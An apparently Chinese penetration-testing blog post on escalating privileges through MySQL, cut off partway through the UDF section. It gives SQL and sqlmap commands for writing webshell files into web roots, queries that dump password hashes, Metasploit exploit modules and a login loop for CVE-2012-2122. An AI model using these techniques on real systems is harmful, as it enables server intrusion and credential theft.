@@ -1,0 +1,943 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>MySQL 提权方法整理 - Geekby&#39;s Blog</title><meta name="Description" content="MySQL 提权方法整理"><meta property="og:title" content="MySQL 提权方法整理" />
+<meta property="og:description" content="MySQL 提权方法整理" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-01-19T13:25:00+08:00" />
+<meta property="article:modified_time" content="2021-01-19T13:25:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="MySQL 提权方法整理"/>
+<meta name="twitter:description" content="MySQL 提权方法整理"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" /><link rel="prev" href="https://www.geekby.site/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "MySQL 提权方法整理",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2021\/01\/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试, 提权","wordcount":  863 ,
+        "url": "https:\/\/www.geekby.site\/2021\/01\/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86\/","datePublished": "2021-01-19T13:25:00+08:00","dateModified": "2021-01-19T13:25:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "MySQL 提权方法整理"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">MySQL 提权方法整理</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a>&nbsp;<a href="/categories/%E5%B8%B8%E7%94%A8/"><i class="far fa-folder fa-fw"></i>常用</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-19">2021-01-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 863 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-initial-access">1 Initial Access</a>
+      <ul>
+        <li><a href="#11-数据库权限">1.1 数据库权限</a></li>
+        <li><a href="#12-webshell-权限">1.2 webshell 权限</a>
+          <ul>
+            <li><a href="#121-into-outfile-写文件">1.2.1 into outfile 写文件</a></li>
+            <li><a href="#122-terminated-by-写文件">1.2.2 terminated by 写文件</a></li>
+            <li><a href="#123-general-log-写文件">1.2.3 general log 写文件</a></li>
+          </ul>
+        </li>
+        <li><a href="#13-hash-破解">1.3 Hash 破解</a></li>
+        <li><a href="#14-mysql-1day-漏洞">1.4 MySQL 1Day 漏洞</a>
+          <ul>
+            <li><a href="#141-yassl-缓冲区溢出">1.4.1 yaSSL 缓冲区溢出</a></li>
+            <li><a href="#142-cve-2012-2122">1.4.2 CVE-2012-2122</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#2-udf-提权">2 UDF 提权</a>
+      <ul>
+        <li><a href="#21-手动实现">2.1 手动实现</a>
+          <ul>
+            <li><a href="#211-动态链接库">2.1.1 动态链接库</a></li>
+            <li><a href="#212-插件目录存放位置">2.1.2 插件目录存放位置</a></li>
+            <li><a href="#213-写入动态链接库">2.1.3 写入动态链接库</a></li>
+            <li><a href="#214-命令执行">2.1.4 命令执行</a></li>
+            <li><a href="#215-清理痕迹">2.1.5 清理痕迹</a></li>
+          </ul>
+        </li>
+        <li><a href="#22-自动化实现">2.2 自动化实现</a></li>
+        <li><a href="#23-udf-shell">2.3 UDF Shell</a>
+          <ul>
+            <li><a href="#231-udfphp">2.3.1 UDF.PHP</a></li>
+            <li><a href="#232-navicat-mysql">2.3.2 Navicat MySQL</a></li>
+          </ul>
+        </li>
+        <li><a href="#24-反弹端口提权">2.4 反弹端口提权</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-mof-提权">3 MOF 提权</a>
+      <ul>
+        <li><a href="#31-原理">3.1 原理</a></li>
+        <li><a href="#32-手动复现">3.2 手动复现</a>
+          <ul>
+            <li><a href="#321-上传-mof-文件">3.2.1 上传 mof 文件</a></li>
+            <li><a href="#322-痕迹清理">3.2.2 痕迹清理</a></li>
+          </ul>
+        </li>
+        <li><a href="#33-自动化实现">3.3 自动化实现</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-启动项提权">4 启动项提权</a>
+      <ul>
+        <li><a href="#41-启动项路径">4.1 启动项路径</a></li>
+        <li><a href="#42-写入文件">4.2 写入文件</a></li>
+        <li><a href="#42-msf-自动化实现">4.2 MSF 自动化实现</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-cve-2016-6663">4 CVE-2016-6663</a>
+      <ul>
+        <li><a href="#41-原理">4.1 原理</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="mysql-提权方法整理">MySQL 提权方法整理</h1>
+<h2 id="1-initial-access">1 Initial Access</h2>
+<h3 id="11-数据库权限">1.1 数据库权限</h3>
+<p>拿到数据库操作权限的方法无外乎有以下几种：</p>
+<ul>
+<li>3306 弱口令爆破</li>
+<li>sqlmap 的 &ndash;sql-shell 模式</li>
+<li>网站的数据库配置文件中拿到明文密码信息</li>
+<li>mysql 1day 漏洞获取权限</li>
+</ul>
+<h3 id="12-webshell-权限">1.2 webshell 权限</h3>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>前提<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ul>
+<li>已知网站物理路径且该路径有写权限</li>
+<li>高权限数据库用户</li>
+<li>secure_file_priv 无限制</li>
+</ul>
+</div>
+        </div>
+    </div>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%secure_file_priv%&#39;</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="o">+------------------+-------+</span><span class="w">
+</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">+------------------+-------+</span><span class="w">
+</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">secure_file_priv</span><span class="w"> </span><span class="o">|</span><span class="w">       </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">+------------------+-------+</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+</blockquote>
+<p>具体原理在「SQL 注入相关」文章中已有详述，不在此赘述。</p>
+<h4 id="121-into-outfile-写文件">1.2.1 into outfile 写文件</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;/var/www/html/info.php&#39;</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>sqlmap 下可以执行如下操作：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sqlmap -u <span class="s2">&#34;http://x.x.x.x/?id=x&#34;</span> --file-write<span class="o">=</span><span class="s2">&#34;/path/to/shell.php&#34;</span> --file-dest<span class="o">=</span><span class="s2">&#34;/var/www/html/test/shell.php&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p>
+<h4 id="122-terminated-by-写文件">1.2.2 terminated by 写文件</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;C:/wamp64/www/work/webshell.php&#39;</span><span class="w"> </span><span class="n">lines</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo() ?&gt;&#39;</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="123-general-log-写文件">1.2.3 general log 写文件</h4>
+<p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</div>
+        </div>
+    </div>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;general%&#39;</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="o">+------------------+---------------------------------+</span><span class="w">
+</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w">                           </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">+------------------+---------------------------------+</span><span class="w">
+</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">OFF</span><span class="w">                             </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log_file</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">c1595d3a029a</span><span class="p">.</span><span class="n">log</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">+------------------+---------------------------------+</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>通过将 <code>general_log</code> 存储位置改为 web 目录。同时，向日志文件里面写入内容的话，那么就可以成功 getshell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="c1"># 更改日志文件位置
+</span><span class="c1"></span><span class="kt">set</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="n">general_log</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;ON&#34;</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="kt">set</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="n">general_log_file</span><span class="o">=</span><span class="s1">&#39;/var/www/html/info.php&#39;</span><span class="p">;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="c1"># 查看当前配置
+</span><span class="c1"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;general%&#39;</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="o">+------------------+-----------------------------+</span><span class="w">
+</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w">                       </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">+------------------+-----------------------------+</span><span class="w">
+</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="k">ON</span><span class="w">                          </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log_file</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">+------------------+-----------------------------+</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="c1"># 往日志里面写入 payload
+</span><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="details admonition warning open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-exclamation-triangle fa-fw"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>文件虽然可以写入，但是该文件的权限是 MySQL 创建的 ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">-rw-rw---- 1 mysql mysql 293 Feb 19 10:29 shell.php
+</code></pre></td></tr></table>
+</div>
+</div><p>访问这个 php 文件会出现 HTTP 500 的状态码，结论是 Linux 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些。</p>
+</div>
+        </div>
+    </div>
+<h3 id="13-hash-破解">1.3 Hash 破解</h3>
+<p>假设存在 SQL 注入 DBA 权限，如果目标 3306 端口也是可以访问通的话，可以尝试读取 MySQL 的 Hash 来解密：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">6</span><span class="w"> </span><span class="err">版本</span><span class="w">
+</span><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">host</span><span class="p">,</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="w"> </span><span class="err">版本</span><span class="w">
+</span><span class="w"></span><span class="n">mysql</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">host</span><span class="p">,</span><span class="k">user</span><span class="p">,</span><span class="n">authentication_string</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119104115.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119104115.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119104115.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119104115.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119104115.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119104115.png-water_print" /></p>
+<p>之后可以通过在线界面网站解密。</p>
+<h3 id="14-mysql-1day-漏洞">1.4 MySQL 1Day 漏洞</h3>
+<h4 id="141-yassl-缓冲区溢出">1.4.1 yaSSL 缓冲区溢出</h4>
+<p>MSF 里面已经集成好了对应的模块：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/windows/mysql/mysql_yassl_hello
+msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="142-cve-2012-2122">1.4.2 CVE-2012-2122</h4>
+<p>知道用户名多次输入错误的密码会有几率可以直接成功登陆进数据库，可以循环 1000 次登陆数据库：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1</span> 1000<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> mysql -uroot -pwrong -h 127.0.0.1 -P3306 <span class="p">;</span> <span class="k">done</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>在 MSF 中有对应的利用模块：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119110448.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119110448.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119110448.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119110448.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119110448.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119110448.png-water_print" /></p>
+<h2 id="2-udf-提权">2 UDF 提权</h2>
+<blockquote>
+<p>User Defined Function - 自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version() 等方便。</p>
+</blockquote>
+<h3 id="21-手动实现">2.1 手动实现</h3>
+<h4 id="211-动态链接库">2.1.1 动态链接库</h4>
+<p>如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<ul>
+<li>sqlmap 中的动态链接文件：</li>
+</ul>
+<p><code>/path/to/sqlmap/data/udf/mysql</code></p>
+<p>sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具cloak.py 来解码使用，具体使用方法参考「SQL 注入相关」文章。</p>
+<ul>
+<li>msf 中的动态链接库文件：</li>
+</ul>
+<p><code>/path/to/msf/embedded/framework/data/exploits/mysql</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119111715.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119111715.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119111715.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119111715.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119111715.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119111715.png-water_print" /></p>
+<h4 id="212-插件目录存放位置">2.1.2 插件目录存放位置</h4>
+<p>通过如下 SQL 语句来实现：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%plugin%&#39;</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="o">+</span><span class="c1">---------------+------------------------------+
+</span><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w">                        </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">+</span><span class="c1">---------------+------------------------------+
